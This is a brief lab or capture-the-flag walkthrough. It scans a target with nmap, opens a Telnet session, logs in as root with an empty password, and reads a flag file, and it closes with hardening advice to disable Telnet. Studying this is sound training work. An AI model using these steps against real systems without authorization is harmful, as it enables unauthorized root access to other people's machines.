# Telnet — unauthenticated root (lab)

Telnet (**TCP 23**) sends traffic in **cleartext**. Labs sometimes expose Telnet with **no authentication** on privileged accounts—documented here only for **authorized** training.

---

## Step 1 — Port scan

**Command:**

```bash
nmap -sV <target-ip>
```

| Flag | Purpose |
|------|---------|
| `-sV` | Determine service banner/version on open ports |

**Example line:** `23/tcp open telnet`

**QC:** Replace `<target-ip>` with the lab machine (do not leave `192.168.X.X` placeholders in final notes).

---

## Step 2 — Telnet session

**Connect:**

```bash
telnet <target-ip>
```

At prompts, test whether **root** accepts an **empty password** (lab-only misconfiguration):

```text
login: root
Password: [Enter]
```

If successful, you have an interactive **root** shell over cleartext Telnet.

**QC:** Prefer **`nc`** or **`openssl s_client`** for banner grabs when you do not need a full TTY; use Telnet only where the service requires it.

---

## Step 3 — Flag or post-access

```bash
ls -la
cat flag.txt
```

Adjust paths per the lab layout.

---

## Summary

| Phase | Action | Result |
|-------|--------|--------|
| Scan | `nmap -sV <target-ip>` | Telnet on **23/tcp** |
| Access | `telnet <target-ip>` | Root with blank password |
| Read | `ls`, `cat flag.txt` | Objective data retrieved |

---

## Notes

- Real networks should **disable Telnet** and use **SSH** with key-based auth and MFA.
- Embedded/ICS environments may still expose Telnet—treat as **critical** exposure when reachable from untrusted networks.

**Status:** lab session completed.
